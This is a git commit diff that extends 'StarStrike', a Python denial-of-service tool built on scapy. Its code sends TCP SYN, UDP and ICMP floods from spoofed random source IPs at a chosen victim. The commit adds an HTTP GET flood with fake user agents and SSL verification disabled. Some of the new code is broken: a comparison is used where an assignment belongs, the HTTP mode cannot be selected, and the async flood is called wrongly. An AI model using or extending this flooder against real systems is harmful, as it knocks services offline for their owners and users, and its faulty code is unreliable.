47947a9dd40be36a7406b8a4261de5b3c296080f
MikyIsDaBest <147923845+MikyIsDaBest@users.noreply.github.com>
2026-07-28 10:58:09 +0200

    Refactor StarStrike for enhanced functionality

--- starstrike.py
+++ starstrike.py
@@ -1,9 +1,10 @@
 ##############################################################
-#           _____ __             _____ __     _ __           #
-#          / ___// /_____ ______/ ___// /____ (_) /_____     #
-#         \__ \/ __/ __ `/ ___/\__ \/ __/ __/ / //_/ _ \     #
-#         ___/ / /_/ /_/ / /   ___/ / /_/ /_/ / ,< /  __/    #
-#        /____/\__/\__,_/_/   /____/\__/\__/_/_/|_|\___/     #                                                          
+#          _____ __             _____ __     _ __            #
+#         / ___// /_____ ______/ ___// /____ (_) /_____      #
+#        \__ \/ __/ __ `/ ___/\__ \/ __/ __/ / //_/ _ \      #
+#        ___/ / /_/ /_/ / /   ___/ / /_/ /_/ / ,< /  __/     #
+#       /____/\__/\__,_/_/   /____/\__/\__/_/_/|_|\___/      #
+#                                                            #
 ##############################################################
 #                       !WARNING!                            #
 #                                                            #
@@ -18,13 +19,27 @@
 #                      made by solez                         #
 ##############################################################
 
+#the glorious banner was made by mikes
+
 import sys
 import random
 import os
 from time import sleep
 import threading
 from scapy.all import send, IP, TCP, UDP, Raw, ICMP
+from aiohttp import TCPConnector, ClientTimeout, ClientSession, ClientError
+import asyncio
+from fake_useragent import UserAgent
 
+def print_banner():
+    print(r'''
+#          _____ __             _____ __     _ __            #
+#         / ___// /_____ ______/ ___// /____ (_) /_____      #
+#        \__ \/ __/ __ `/ ___/\__ \/ __/ __/ / //_/ _ \      #
+#        ___/ / /_/ /_/ / /   ___/ / /_/ /  / ,< /  __/      #
+#       /____/\__/\__,_/_/   /____/\__/\/ _/_/|_|\___/       #
+#                                                            #
+''')
 
 tsize = 0 #total bytes sent
 types = ["tcp", "udp", "icmp"] # types of attack
@@ -38,6 +53,14 @@ payload_size=65455
 typea="tcp" # the type of attack
 dest_ip="127.0.0.1"
 lock_port=True
+port=3703
+dest_url = "about:blank"
+n_requests = 1000
+
+#validate ip
+def validate_ip(ip):
+    if len(ip.split('.')) == 4: return True
+    return False
 
 #-- arg handling --#
 if len(sys.argv) > 1:
@@ -56,13 +79,25 @@ if len(sys.argv) > 1:
             typea = arg.removeprefix("--type")
             if not typea in types: exit(f"{type} as an attack type doesnt exist!")
         # the victims ip
-        if arg.startswith("--victim"):
-            dest_ip = arg.removeprefix("--victim")
-        #unlock port
+        if arg.startswith("--victimip"):
+            dest_ip = arg.removeprefix("--victimip")
+            if not validate_ip(dest_ip): exit("Invalid IP!")
+        # the victims url for http flood
+        if arg.startswith("--victimurl"):
+            dest_url = arg.removeprefix("--victimurl")
+        # unlock port randomization
         if arg == "--unlockport":
             lock_port = False
-else: exit("Check the code to see how you configure it")
+        # set port
+        if arg.startswith("--setport"):
+            port = int(arg.removeprefix("--setport"))
+            if not port>10000: exit(f"Port {port} is invalid!")
+        # set number of requests for http flood
+        if arg.startswith("--rqn"):
+            n_requests == int(arg.removeprefix("--rqn"))
+else: exit("Check the code to see how you configure it, or just do python starstrike.py --victimip[target ip]")
 
+#stop event
 stop = threading.Event()
 
 #-- attack types --#
@@ -70,10 +105,10 @@ stop = threading.Event()
 #do a tcp syn flood attack
 def tcp_flood(thread):
     global tsize
-    port = 3703
+    global port
     while not stop.is_set():
         if not lock_port: port = random.randint(0, 9999) #if lock_port is False, generate a random port (idk why i added this)
-        payload = os.urandom(payload_size) #create a payload of payload_size with random contents
+        payload = os.urandom(payload_size) #create a payload with random contents
         source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" #generate a random source ip
         packet = IP(src = source, dst = dest_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) #create a packet with a spoofed ip
         try:send(packet, verbose=False) #send the packet
@@ -85,7 +120,6 @@ def tcp_flood(thread):
 #do a icmp flood attack
 def icmp_flood(thread):
     global tsize
-    port = 3703
     while not stop.is_set():
         if not lock_port: port = random.randint(0, 9999)
         payload = os.urandom(payload_size)
@@ -99,16 +133,46 @@ def icmp_flood(thread):
 #do a udp flood attack
 def udp_flood(thread):
     global tsize
-    port = 3703
+    global port
     while not stop.is_set():
         if not lock_port: port = random.randint(0, 9999)
         payload = os.urandom(payload_size)
         source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
         packet = IP(src = source, dst = dest_ip) / UDP(dport=port) / Raw(load = payload)
-        send(packet, verbose=False)
+        try: send(packet, verbose=False)
+        except Exception as e: print(e)
         tsize += payload_size
         if doprint: print(f"[UDP] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}")
         sleep(0)
+
+#send request, used for http flood
+async def send_req(session, thread):
+    global tsize
+    try:
+        # fake headers to make the request more legit
+        headers = {
+            "User-Agent": UserAgent().random,
+            "Connection": "keep-alive",
+            "Accept": "*/*"
+        }
+        #disable ssl verif
+        async with session.get(dest_url, headers = headers, ssl = False ) as response:
+            tsize +=1
+            print(f"[HTTP] GET REQUEST SENT TO {dest_url} STATUS: {response.status} THREAD {thread}")
+    except TimeoutError:
+        print("[HTTP] timed out, trying again...")
+    except ClientError as e:
+        print(f"[HTTP] client error \n{e}")
+
+#http flood attack
+async def http_flood(n_req, thread):
+    connection = TCPConnector()
+    timeout = ClientTimeout(total=10)
+    async with ClientSession(connector = connection, timeout = timeout) as session:
+        tasks = [send_req(session, thread) for _ in range(n_req)]
+        responses = await(asyncio.gather(*tasks))
+        (response for response in responses)
+
 
 #-- helpers --#
 def stopv():
@@ -117,20 +181,19 @@ def stopv():
     print("Stopping StarStrike...")
     for thread in athreads:
         thread.join()
+    print(f"total sent (in megabytes): {tsize/1024/1024}")
 
 def attack(thread):
     match typea:
         case "tcp": tcp_flood(thread)
         case "udp": udp_flood(thread)
         case "icmp": icmp_flood(thread)
+        case "http": http_flood()
 
 #-- MAIN --#
 def main():
-    print(''' 
-    ★ StarStrike ★
-    created by solez
-    READ THE WARNING AT THE TOP OF THE SCRIPT
-    ''')
+    print_banner()
+    print("created by solez, for NETWORK0 group\n")
     # HelloWorld("print")
     tcount = threads
     while not len(athreads) == threads:
